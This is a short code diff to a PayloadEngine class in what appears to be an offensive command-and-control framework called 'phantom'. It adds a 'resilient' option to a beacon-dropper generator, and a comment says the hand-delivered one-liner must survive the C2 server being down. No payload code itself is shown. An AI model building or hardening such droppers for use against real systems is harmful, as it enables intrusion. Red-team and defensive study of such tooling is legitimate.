@@ -139,7 +139,10 @@ class PayloadEngine:
         payload).
         """
         from phantom.utils.builder import generate_dropper
-        dropper = generate_dropper(platform, lhost, lport, use_ssl=use_ssl)
+        # resilient: the beacon dropper is a hand-delivered one-liner that
+        # has to survive the C2 not being up yet (option C, 8.1)
+        dropper = generate_dropper(platform, lhost, lport, use_ssl=use_ssl,
+                                   resilient=True)
         if not dropper:
             raise ValueError(f"no dropper defined for platform {platform}")
         return Payload("stage", platform, "beacon-dropper", dropper,
